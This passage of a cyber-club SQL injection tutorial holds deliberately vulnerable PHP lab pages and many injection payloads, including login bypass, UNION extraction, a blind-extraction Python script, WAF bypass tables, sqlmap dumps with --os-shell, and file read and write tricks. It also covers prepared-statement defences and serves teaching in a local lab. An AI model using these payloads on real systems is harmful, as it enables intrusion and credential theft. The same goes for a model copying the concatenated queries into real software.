                    echo '<p>Your email: ' . htmlspecialchars($user_data['email']) . '</p>';
                    if ($user_data['role'] === 'admin') {
                        echo '<h4>Flag: CTF{Login_Bypass_Successful}</h4>';
                    }
                    echo '</div>';
                } elseif (!$error) {
                    echo '<div class="error-box">';
                    echo '<strong>Login failed:</strong> Invalid username or password.';
                    echo '</div>';
                }
            }
            ?>

            <div class="hint-box">
                <strong>Hint:</strong> Think about how you can make the WHERE clause always true.
                What if you could comment out the rest of the query with <code>-- -</code>?
            </div>
        </main>

        <footer>
            <p>DIT Cyber Club — SQL Injection Lab</p>
        </footer>
    </div>
</body>
</html>
```

#### File 5: `search.php` — UNION-Based SQLi Challenge

```php
<?php
$host = 'localhost';
$user = 'root';
$pass = '';
$db = 'sqli_lab';

$conn = null;
$db_error = null;
try {
    $conn = new mysqli($host, $user, $pass, $db);
    $conn->set_charset('utf8mb4');
} catch (mysqli_sql_exception $e) {
    $db_error = $e->getMessage();
}

$results = [];
$error = null;
$query = null;

if (isset($_GET['search'])) {
    $search = $_GET['search'];

    // VULNERABLE QUERY
    $query = "SELECT id, name, description, price FROM products WHERE name LIKE '%$search%' OR description LIKE '%$search%'";

    if ($conn) {
        try {
            $result = $conn->query($query);
            while ($row = $result->fetch_assoc()) {
                $results[] = $row;
            }
        } catch (mysqli_sql_exception $e) {
            $error = $e->getMessage();
        }
    } else {
        $error = $db_error ?: 'Database connection failed.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Search Injection Challenge</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js" defer></script>
</head>
<body>
    <div class="container">
        <header>
            <h1>Challenge 2: Search Injection</h1>
            <p>Use UNION-based SQLi to extract data from other tables</p>
        </header>

        <nav>
            <a href="index.html">Home</a>
            <a href="login.php">Login Challenge</a>
            <a href="search.php">Search Challenge</a>
            <a href="product.php">Product Challenge</a>
            <a href="user.php">User Profile Challenge</a>
        </nav>

        <main>
            <div class="info-box">
                <h4>Objective</h4>
                <p>Find the number of columns, then extract usernames and passwords from the <strong>users</strong> table.</p>
                <div class="query-box">SELECT id, name, description, price FROM products WHERE name LIKE '%$search%' OR description LIKE '%$search%'</div>
            </div>

            <form method="GET" action="">
                <div class="form-group">
                    <label for="search">Search products</label>
                    <input type="text" id="search" name="search" placeholder="e.g., Laptop" value="<?php echo isset($_GET['search']) ? htmlspecialchars($_GET['search']) : ''; ?>">
                </div>
                <button type="submit" class="btn">Search</button>
            </form>

            <?php if ($query): ?>
                <div class="result-box">
                    <strong>Query executed:</strong>
                    <div class="query-box"><?php echo htmlspecialchars($query); ?></div>
                </div>
            <?php endif; ?>

            <?php if ($error): ?>
                <div class="error-box">
                    <strong>Database error:</strong> <?php echo htmlspecialchars($error); ?>
                </div>
            <?php endif; ?>

            <?php if ($db_error && !isset($_GET['search'])): ?>
                <div class="error-box">
                    <strong>Database connection error:</strong> <?php echo htmlspecialchars($db_error); ?>
                </div>
            <?php endif; ?>

            <?php if (!empty($results)): ?>
                <div class="result-box">
                    <h3>Search Results (<?php echo count($results); ?> found)</h3>
                    <table>
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>Name</th>
                                <th>Description</th>
                                <th>Price</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($results as $row): ?>
                            <tr>
                                <td><?php echo htmlspecialchars($row['id'] ?? 'N/A'); ?></td>
                                <td><?php echo htmlspecialchars($row['name'] ?? 'N/A'); ?></td>
                                <td><?php echo htmlspecialchars($row['description'] ?? 'N/A'); ?></td>
                                <td><?php echo htmlspecialchars($row['price'] ?? 'N/A'); ?></td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            <?php elseif ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['search'])): ?>
                <div class="result-box">
                    <strong>No products found matching your search.</strong>
                </div>
            <?php endif; ?>

            <div class="hint-box">
                <strong>Hint:</strong> Try using <code>' UNION SELECT 1,2,3,4 -- -</code> to find the column count.
                Then replace 1,2,3,4 with data from the users table.
            </div>
        </main>

        <footer>
            <p>DIT Cyber Club — SQL Injection Lab</p>
        </footer>
    </div>
</body>
</html>
```

#### File 6: `product.php` — Integer-Based UNION SQLi Challenge

```php
<?php
$host = 'localhost';
$user = 'root';
$pass = '';
$db = 'sqli_lab';

$conn = null;
$db_error = null;
try {
    $conn = new mysqli($host, $user, $pass, $db);
    $conn->set_charset('utf8mb4');
} catch (mysqli_sql_exception $e) {
    $db_error = $e->getMessage();
}

$rows = [];
$error = null;
$query = null;

if (isset($_GET['id'])) {
    $id = $_GET['id'];

    // VULNERABLE QUERY
    $query = "SELECT id, name, description, price FROM products WHERE id = $id";

    if ($conn) {
        try {
            $result = $conn->query($query);
            while ($row = $result->fetch_assoc()) {
                $rows[] = $row;
            }
            if (empty($rows)) {
                $error = 'Product not found.';
            }
        } catch (mysqli_sql_exception $e) {
            $error = $e->getMessage();
        }
    } else {
        $error = $db_error ?: 'Database connection failed.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Product Enumeration Challenge</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js" defer></script>
</head>
<body>
    <div class="container">
        <header>
            <h1>Challenge 3: Product Enumeration</h1>
            <p>Exploit the product ID parameter with integer-based SQL injection</p>
        </header>

        <nav>
            <a href="index.html">Home</a>
            <a href="login.php">Login Challenge</a>
            <a href="search.php">Search Challenge</a>
            <a href="product.php">Product Challenge</a>
            <a href="user.php">User Profile Challenge</a>
        </nav>

        <main>
            <div class="info-box">
                <h4>Objective</h4>
                <p>The product ID is injected directly without quotes. Use this to extract the database version, current user, table names, and data from the <strong>secrets</strong> table.</p>
                <div class="query-box">SELECT id, name, description, price FROM products WHERE id = $id</div>
            </div>

            <form method="GET" action="">
                <div class="form-group">
                    <label for="id">Product ID</label>
                    <input type="text" id="id" name="id" placeholder="Enter product ID (e.g., 1)" value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : '1'; ?>">
                </div>
                <button type="submit" class="btn">View Product</button>
            </form>

            <?php if ($query): ?>
                <div class="result-box">
                    <strong>Query executed:</strong>
                    <div class="query-box"><?php echo htmlspecialchars($query); ?></div>
                </div>
            <?php endif; ?>

            <?php if (!empty($rows)): ?>
                <div class="result-box">
                    <h3>Results (<?php echo count($rows); ?> row<?php echo count($rows) === 1 ? '' : 's'; ?>)</h3>
                    <table>
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>Name</th>
                                <th>Description</th>
                                <th>Price</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($rows as $row): ?>
                            <tr>
                                <td><?php echo htmlspecialchars($row['id'] ?? 'N/A'); ?></td>
                                <td><?php echo htmlspecialchars($row['name'] ?? 'N/A'); ?></td>
                                <td><?php echo htmlspecialchars($row['description'] ?? 'N/A'); ?></td>
                                <td><?php echo htmlspecialchars($row['price'] ?? 'N/A'); ?></td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            <?php endif; ?>

            <?php if ($error): ?>
                <div class="error-box">
                    <strong>Error:</strong> <?php echo htmlspecialchars($error); ?>
                </div>
            <?php endif; ?>

            <?php if ($db_error && !isset($_GET['id'])): ?>
                <div class="error-box">
                    <strong>Database connection error:</strong> <?php echo htmlspecialchars($db_error); ?>
                </div>
            <?php endif; ?>

            <div class="hint-box">
                <strong>Hint:</strong> Try <code>1 UNION SELECT 1, @@version, user(), 4</code> to get the database version and current user.
                Then try <code>1 UNION SELECT 1, secret_key, secret_value, 4 FROM secrets</code>.
            </div>
        </main>

        <footer>
            <p>DIT Cyber Club — SQL Injection Lab</p>
        </footer>
    </div>
</body>
</html>
```

#### File 7: `user.php` — Blind SQLi Challenge

```php
<?php
$host = 'localhost';
$user = 'root';
$pass = '';
$db = 'sqli_lab';

$conn = null;
$db_error = null;
try {
    $conn = new mysqli($host, $user, $pass, $db);
    $conn->set_charset('utf8mb4');
} catch (mysqli_sql_exception $e) {
    $db_error = $e->getMessage();
}

$user_found = false;
$query_error = null;
$query = null;
$execution_time = null;

if (isset($_GET['username'])) {
    $username = $_GET['username'];

    // VULNERABLE QUERY — but only returns YES/NO
    $query = "SELECT * FROM users WHERE username = '$username'";

    if ($conn) {
        $start_time = microtime(true);
        try {
            $result = $conn->query($query);
            $user_found = $result && $result->num_rows > 0;
        } catch (mysqli_sql_exception $e) {
            $query_error = 'Query failed. Check quote balancing and comment syntax.';
            $user_found = false;
        }
        $execution_time = (microtime(true) - $start_time) * 1000;
    } else {
        $query_error = $db_error ?: 'Database connection failed.';
        $user_found = false;
        $execution_time = 0;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blind SQLi Challenge</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js" defer></script>
</head>
<body>
    <div class="container">
        <header>
            <h1>Challenge 4: Blind SQL Injection</h1>
            <p>No sensitive data is displayed — only yes/no behavior and response timing</p>
        </header>

        <nav>
            <a href="index.html">Home</a>
            <a href="login.php">Login Challenge</a>
            <a href="search.php">Search Challenge</a>
            <a href="product.php">Product Challenge</a>
            <a href="user.php">User Profile Challenge</a>
        </nav>

        <main>
            <div class="info-box">
                <h4>Objective</h4>
                <p>The query only returns "User found" or "User not found". Use boolean-based and time-based blind SQLi to infer the admin password character by character.</p>
                <div class="query-box">SELECT * FROM users WHERE username = '$username'</div>
            </div>

            <form method="GET" action="">
                <div class="form-group">
                    <label for="username">Check if username exists</label>
                    <input type="text" id="username" name="username" placeholder="Enter username" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>">
                </div>
                <button type="submit" class="btn">Check User</button>
            </form>

            <?php if ($query): ?>
                <div class="result-box">
                    <strong>Query executed (trainer view):</strong>
                    <div class="query-box" style="opacity: 0.5;"><?php echo htmlspecialchars($query); ?></div>
                </div>
            <?php endif; ?>

            <?php if ($query_error): ?>
                <div class="error-box">
                    <strong>Status:</strong> <?php echo htmlspecialchars($query_error); ?>
                </div>
            <?php endif; ?>

            <?php if (isset($_GET['username'])): ?>
                <?php if ($user_found): ?>
                    <div class="success-box">
                        <strong>User found.</strong>
                        <p style="margin-top: 10px; font-size: 0.85em; color: #666;">Response time: <?php echo number_format((float) $execution_time, 0); ?>ms</p>
                    </div>
                <?php else: ?>
                    <div class="error-box">
                        <strong>User not found.</strong>
                        <p style="margin-top: 10px; font-size: 0.85em; color: #666;">Response time: <?php echo number_format((float) $execution_time, 0); ?>ms</p>
                    </div>
                <?php endif; ?>
            <?php endif; ?>

            <div class="hint-box">
                <strong>Hint:</strong> Try <code>admin' AND 1=1 -- -</code> — this should show "User found" (true).
                Try <code>admin' AND 1=2 -- -</code> — this should show "User not found" (false).
                Now use this to guess the password character by character:
                <code>admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' -- -</code>
            </div>
        </main>

        <footer>
            <p>DIT Cyber Club — SQL Injection Lab</p>
        </footer>
    </div>
</body>
</html>
```
### 5.5 Running the Lab

```bash
# 1. Start XAMPP
sudo /opt/lampp/lampp start

# 2. Create the database via phpMyAdmin or command line:
#    - Open http://localhost/phpmyadmin
#    - Create database 'sqli_lab'
#    - Run the SQL from section 5.3

# 3. Copy the lab files
sudo cp -r /path/to/sqli_lab /opt/lampp/htdocs/

# 4. Open in browser
#    http://localhost/sqli_lab/

# 5. You can also use your Kali VM:
#    Find your host IP with 'ip addr'
#    From Kali: http://<HOST_IP>/sqli_lab/
```

---

## 6. Hands-On Lab Exercises

### Exercise 1: Login Bypass

**Target:** `http://localhost/sqli_lab/login.php`

**Goal:** Log in as admin without knowing the password.

**Step-by-step:**

1. Try entering `admin` as username and `' OR '1'='1` as password:

   ```
   Username: admin
   Password: ' OR '1'='1
   ```

   The query becomes:
   ```sql
   SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
   ```

   Wait — that checks password='' OR '1'='1'. So admin with empty password OR 1=1 (always true).

2. Better approach — comment out the password check:
   ```
   Username: admin' -- -
   Password: anything
   ```

   Query becomes:
   ```sql
   SELECT * FROM users WHERE username = 'admin' -- -' AND password = 'anything'
   ```

   The `-- -` comments out the rest. It just checks `WHERE username = 'admin'`.

3. Even simpler — bypass entirely:
   ```
   Username: ' OR 1=1 -- -
   Password: anything
   ```

   Query:
   ```sql
   SELECT * FROM users WHERE username = '' OR 1=1 -- -' AND password = 'anything'
   ```

   This returns ALL users. The first one is usually admin.

**Expected result:** You see "Login Successful! Welcome, admin" and get the flag.

### Exercise 2: UNION-Based Data Extraction

**Target:** `http://localhost/sqli_lab/search.php`

**Goal:** Extract usernames and passwords from the users table.

**Step-by-step:**

1. **Find the number of columns:**
   ```
   Search: ' UNION SELECT 1,2,3,4 -- -
   ```
   If 4 columns works, you see 1,2,3,4 as a result.

2. **Find the database name:**
   ```
   Search: ' UNION SELECT 1,database(),3,4 -- -
   ```

3. **Find all tables:**
   ```
   Search: ' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() -- -
   ```

4. **Find columns in the users table:**
   ```
   Search: ' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users' -- -
   ```

5. **Extract data:**
   ```
   Search: ' UNION SELECT 1,username,password,4 FROM users -- -
   ```

6. **Concatenate for cleaner output:**
   ```
   Search: ' UNION SELECT 1,CONCAT(username,':',password),3,4 FROM users -- -
   ```

**Expected result:** You see all usernames and their plaintext passwords.

### Exercise 3: Integer-Based UNION Extraction

**Target:** `http://localhost/sqli_lab/product.php?id=1`

**Goal:** Extract the database version and the secrets table.

**Step-by-step:**

1. **Get version:**
   ```
   URL: product.php?id=1 UNION SELECT 1,@@version,user(),4
   ```

2. **Get current database user:**
   ```
   URL: product.php?id=1 UNION SELECT 1,user(),@@version,4
   ```

3. **Get all tables:**
   ```
   URL: product.php?id=1 UNION SELECT 1,table_name,table_schema,4 FROM information_schema.tables
   ```

4. **Extract from secrets table:**
   ```
   URL: product.php?id=1 UNION SELECT 1,secret_key,secret_value,4 FROM secrets
   ```

**Expected result:** You find the flag and API keys in the secrets table.

### Exercise 4: Blind SQLi Password Cracking

**Target:** `http://localhost/sqli_lab/user.php`

**Goal:** Extract the admin's password character by character.

**Step-by-step:**

1. **Confirm injection works (true condition):**
   ```
   URL: user.php?username=admin' AND 1=1 -- -
   ```
   Result: "User found"

2. **Confirm injection works (false condition):**
   ```
   URL: user.php?username=admin' AND 1=2 -- -
   ```
   Result: "User not found"

3. **Check password length:**
   ```
   URL: user.php?username=admin' AND LENGTH((SELECT password FROM users WHERE username='admin'))=14 -- -
   ```
   Keep changing the number until you get "User found". Admin's password is `supersecret123` which is 14 characters.

4. **Extract first character:**
   ```
   URL: user.php?username=admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s' -- -
   ```
   Result: "User found" (first char is 's')

5. **Extract second character:**
   ```
   URL: user.php?username=admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1)='u' -- -
   ```
   Result: "User found"

6. **Continue for all characters** — you'll build the password: `supersecret123`

**Automation with Python:**

```python
import requests
import string

url = "http://localhost/sqli_lab/user.php"
password = ""
chars = string.ascii_lowercase + string.digits

for pos in range(1, 20):
    for c in chars:
        payload = f"admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{pos},1)='{c}' -- -"
        r = requests.get(url, params={"username": payload})
        if "User found" in r.text:
            password += c
            print(f"Found char {pos}: {c} → Password so far: {password}")
            break
    else:
        print(f"No match for position {pos}, password may be complete.")
        break

print(f"Admin password: {password}")
```

**Expected result:** You extract the password `supersecret123` character by character.

---

## 7. Bypassing Filters & WAFs

### 7.1 Bypassing the Single Quote Filter

If `'` is blocked:

| Technique | Example |
|-----------|---------|
| **Double encoding** | `%2527` (URL encode twice) |
| **UTF-8 encoding** | `%c0%a7` or `%bf%27` |
| **Hex encoding** | `0x272061646d696e` = `' admin` |
| **Use backslash** | If app uses `\` to escape, `\'` produces `\'` which closes the string |
| **Use `char()` function** | `AND 1=char(39)` = `AND 1='` |

### 7.2 Bypassing Keyword Filters

If `SELECT`, `UNION`, etc. are blocked:

| Technique | Example |
|-----------|---------|
| **Case variation** | `UnIoN sElEcT` |
| **Comments inside** | `UN/**/ION SEL/**/ECT` |
| **Line breaks** | `UNION\nSELECT` |
| **Concatenation** | `SEL' 'ECT` (if string concatenation allowed) |
| **Hex encoding** | `0x53454c454354` = `SELECT` |
| **Alternate syntax** | `INTO OUTFILE` instead of `UNION SELECT` |
| **Double URL encode** | `%2555%254e%2549%254f%254e` → `UNION` |

### 7.3 Bypassing Spaces

If spaces are blocked:

| Technique | Example |
|-----------|---------|
| **Comments** | `UNION/**/SELECT/**/1,2,3` |
| **Tabs** | `UNION%09SELECT%091,2,3` |
| **Newlines** | `UNION%0aSELECT%0a1,2,3` |
| **Parentheses** | `UNION(SELECT(1),(2),(3))` |
| **Backticks** | `` UNION`SELECT`1,2,3 `` |

### 7.4 Bypassing `=` and Comparison

| Technique | Example |
|-----------|---------|
| **`LIKE` instead of `=`** | `SELECT * FROM users WHERE username LIKE 'admin'` |
| **`IN` clause** | `WHERE username IN ('admin')` |
| **`BETWEEN`** | `WHERE id BETWEEN 1 AND 1` |
| **`<` and `>`** | `WHERE 'a' < 'b'` |

### 7.5 Bypassing Blacklisted Words

Common blacklisted words: `OR`, `AND`, `UNION`, `SELECT`, `FROM`, `WHERE`, `--`, `#`

| Bypass Technique | Example |
|------------------|---------|
| **Double writing** | `OORR` → if filter removes OR, it becomes OR after removal |
| **Nested bypass** | `UNUNIONION` → removal of UNION leaves UNION |
| **Null bytes** | `UN%00ION` |
| **Case + comments** | `uNiOn/**/sElEcT` |
| **`||` for OR** | `' || 1=1 --` (Oracle/PostgreSQL) |
| **`&&` for AND** | `' && 1=1 --` (MySQL) |
| **`^` for XOR** | `' ^ 1=1 --` |

### 7.6 Real-World WAF Bypass Examples

```sql
-- Bypassing ModSecurity
/*!12345UNION*/ /*!12345SELECT*/ 1,2,3

-- Bypass with scientific notation
1e1 UNION SELECT 1,2,3

-- Bypass with information_schema variant
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

-- MySQL integer trick
UNION SELECT 1,2,3 FROM users WHERE 1=1 INTO @a,@b,@c
```

---

## 8. Automated SQLi Tools

### 8.1 SQLmap — The Swiss Army Knife

**Installation:**
```bash
# Kali has it pre-installed
# Otherwise:
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py
```

**Basic usage on our lab:**

```bash
# Test the login page
python sqlmap.py -u "http://localhost/sqli_lab/login.php" --method POST --data "username=admin&password=test" --batch

# Enumerate databases
python sqlmap.py -u "http://localhost/sqli_lab/search.php?search=test" --dbs --batch

# Enumerate tables in sqli_lab
python sqlmap.py -u "http://localhost/sqli_lab/product.php?id=1" --tables -D sqli_lab --batch

# Dump the users table
python sqlmap.py -u "http://localhost/sqli_lab/product.php?id=1" --dump -D sqli_lab -T users --batch

# Blind injection on user.php
python sqlmap.py -u "http://localhost/sqli_lab/user.php?username=admin" --technique=B --dump --batch

# Get OS shell (if permissions allow)
python sqlmap.py -u "http://localhost/sqli_lab/product.php?id=1" --os-shell --batch
```

**SQLmap flags cheatsheet:**

| Flag | Purpose |
|------|---------|
| `--dbs` | List databases |
| `--tables` | List tables in current/specified DB |
| `--columns` | List columns in a table |
| `--dump` | Dump table data |
| `-D dbname` | Specify database |
| `-T tablename` | Specify table |
| `-C col1,col2` | Specify columns |
| `--technique=B/E/U/S/T` | Blind/Error/Union/Stacked/Time techniques |
| `--level=1-5` | Test depth (higher = more thorough) |
| `--risk=1-3` | Risk level (3 = destructive) |
| `--os-shell` | Get OS command shell |
| `--batch` | Default answers (non-interactive) |
| `--cookie="..."` | Set session cookie |
| `--random-agent` | Random User-Agent |

### 8.2 Other Tools

| Tool | Description |
|------|-------------|
| **jSQL Injection** | GUI tool, user-friendly |
| **Havij** | Old but effective (Windows, paid) |
| **NoSQLMap** | For NoSQL databases (MongoDB) |
| **BBQSQL** | Blind SQLi framework |
| **Whitewidow** | Automated SQLi scanner |

---

## 9. Preventing SQL Injection

### 9.1 The Golden Rule: Parameterized Queries (Prepared Statements)

Instead of concatenating user input into SQL, use **placeholders** and pass parameters separately.

**PHP (MySQLi — Prepared Statements):**
```php
<?php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);  // "ss" = two string parameters
$stmt->execute();
$result = $stmt->get_result();
$user = $result->fetch_assoc();
?>
```

**PHP (PDO — Portable):**
```php
<?php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute(['username' => $username, 'password' => $password]);
$user = $stmt->fetch();
?>
```

**Python (Flask + SQLite):**
```python
import sqlite3

conn = sqlite3.connect('database.db')
cursor = conn.cursor()
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
user = cursor.fetchone()
```

**Node.js (mysql2):**
```javascript
const mysql = require('mysql2');
const connection = mysql.createConnection({...});

connection.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password],
    (err, results) => { /* ... */ }
);
```

**Java (JDBC):**
```java
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

**C# (.NET):**
```csharp
string query = "SELECT * FROM users WHERE username = @username AND password = @password";
SqlCommand cmd = new SqlCommand(query, connection);
cmd.Parameters.AddWithValue("@username", username);
cmd.Parameters.AddWithValue("@password", password);
SqlDataReader reader = cmd.ExecuteReader();
```

### 9.2 Second Line of Defense: Input Validation

Even with prepared statements, validate input:

```php
<?php
// Whitelist validation — only allow specific values
$allowed_categories = ['electronics', 'clothing', 'books'];
if (!in_array($_GET['category'], $allowed_categories)) {
    die("Invalid category");
}

// Type checking
$id = (int)$_GET['id'];  // Force to integer

// Length limits
if (strlen($username) > 50) {
    die("Username too long");
}
?>
```

### 9.3 Third Line of Defense: Escaping (Only as Fallback)

If for some reason you can't use prepared statements:

```php
<?php
// mysqli_real_escape_string — escapes dangerous characters
$safe_username = mysqli_real_escape_string($conn, $username);
$query = "SELECT * FROM users WHERE username = '$safe_username'";
?>
```

**Warning:** Escaping is NOT as safe as prepared statements. It can still be bypassed with certain character sets (GBK, Big5).

### 9.4 Database Hardening

```sql
-- Remove unnecessary privileges
REVOKE FILE, PROCESS, SUPER, SHUTDOWN ON *.* FROM 'webapp'@'localhost';
REVOKE DROP, ALTER, CREATE ON sqli_lab.* FROM 'webapp'@'localhost';

-- Principle of least privilege
GRANT SELECT, INSERT, UPDATE ON sqli_lab.* TO 'webapp'@'localhost';

-- Don't use root in application
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON sqli_lab.* TO 'webapp'@'localhost';

-- Disable LOAD_FILE and INTO OUTFILE
SET GLOBAL secure_file_priv = '/var/lib/mysql-files/';

-- Hide errors from users (in PHP)
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
```

### 9.5 Web Application Firewall (WAF)

```bash
# ModSecurity for Apache
sudo apt install libapache2-mod-security2
sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
# Edit: SecRuleEngine On
sudo systemctl restart apache2
```

**Note:** WAF is a supplement, not a replacement for secure coding.

### 9.6 Security Checklist

- [ ] All database queries use prepared statements
- [ ] No dynamic SQL constructed with string concatenation
- [ ] User input is validated (type, length, format)
- [ ] Database user has minimal privileges
- [ ] Error messages don't leak SQL errors
- [ ] WAF or input filtering in place
- [ ] Regular security audits and code reviews
- [ ] Parameterized stored procedures for complex operations

---

## 10. Cheatsheet & Quick Reference

### MySQL Version Detection
```sql
@@version
VERSION()
```

### Current User
```sql
USER()
CURRENT_USER()
CURRENT_USER
```

### Current Database
```sql
DATABASE()
SCHEMA()
```

### List Databases
```sql
SELECT schema_name FROM information_schema.schemata
```

### List Tables
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()
```

### List Columns
```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### String Concatenation
```sql
-- MySQL
CONCAT('a','b','c')
-- PostgreSQL/MSSQL/Oracle
'a' || 'b' || 'c'
-- MSSQL
'a' + 'b' + 'c'
```

### Substring
```sql
SUBSTRING(string, start, length)
SUBSTR(string, start, length)
MID(string, start, length)
```

### ASCII Value
```sql
ASCII(char)
```

### Character from ASCII
```sql
CHAR(number)   -- MySQL
CHR(number)    -- PostgreSQL, Oracle
```

### Conditional Expressions
```sql
-- MySQL
IF(condition, true_value, false_value)
CASE WHEN condition THEN value ELSE value END

-- MSSQL
CASE WHEN condition THEN value ELSE value END

-- PostgreSQL
CASE WHEN condition THEN value ELSE value END
```

### Sleep/Delay
```sql
-- MySQL
SLEEP(seconds)
BENCHMARK(count, expression)  -- e.g., BENCHMARK(10000000, MD5('a'))

-- PostgreSQL
pg_sleep(seconds)

-- MSSQL
WAITFOR DELAY '0:0:seconds'
```

### Comments
```sql
--  (double dash + space)
#  (MySQL only)
/* comment */
/*! MySQL-specific */  -- MySQL version comment
```

### Useful Information Functions
```sql
-- MySQL
@@datadir        -- Database directory
@@basedir        -- MySQL base directory
@@hostname       -- Server hostname
@@tmpdir         -- Temp directory

-- Current user privileges
SELECT grantee, privilege_type FROM information_schema.user_privileges

-- File read
SELECT LOAD_FILE('/etc/passwd')

-- File write
SELECT 'shell' INTO OUTFILE '/tmp/shell.php'
```

---

## 11. Practice Resources

### Online Labs (Safe & Legal)

| Platform | URL | Description |
|----------|-----|-------------|
| **PortSwigger SQLi Labs** | https://portswigger.net/web-security/sql-injection | 20+ labs, beginner to advanced |
| **TryHackMe — SQL Injection** | https://tryhackme.com/room/sqlilab | Guided room |
| **HackTheBox — SQL Injection** | https://www.hackthebox.com/ | Various machines |
| **DVWA (Damn Vulnerable Web App)** | https://github.com/digininja/DVWA | Install locally |
| **bWAPP** | https://sourceforge.net/projects/bwapp/ | 100+ vulnerabilities |
| **OWASP Juice Shop** | https://owasp.org/www-project-juice-shop/ | Modern Node.js app |

### Your Local Lab

The lab you built in Section 5 is your primary practice environment. Here's a summary of what you can do:

| Page | Vulnerability Type | What to Practice |
|------|-------------------|------------------|
| `login.php` | Authentication bypass | `' OR 1=1 -- -`, `admin' -- -` |
| `search.php` | UNION-based SELECT | Column counting, data extraction |
| `product.php` | Integer-based UNION | Version, user, secrets extraction |
| `user.php` | Blind boolean-based | Password guessing character by character |

### Challenge Progression

1. **Start with login.php** — Get comfortable with the basic concept
2. **Move to search.php** — Learn UNION-based extraction
3. **Try product.php** — Practice without quotes, extract version info
4. **Master user.php** — Blind injection, write a Python script
5. **Use SQLmap** — Automate everything you did manually
6. **PortSwigger Labs** — Apply skills to real-world scenarios
7. **CTF Competitions** — Test your skills under pressure

### Key Takeaways

1. **SQL injection is #2 in the OWASP Top 10** — it's everywhere
2. **Manual exploitation teaches you the fundamentals** — don't rely on SQLmap alone
3. **Prepared statements are the only real defense** — everything else is secondary
4. **Practice legally** — only test systems you own or have permission to test
5. **Document your process** — take screenshots, write notes, build cheatsheets

---

*"The database doesn't know the difference between code and data — that's your job as the developer."*

— DIT Cyber Club
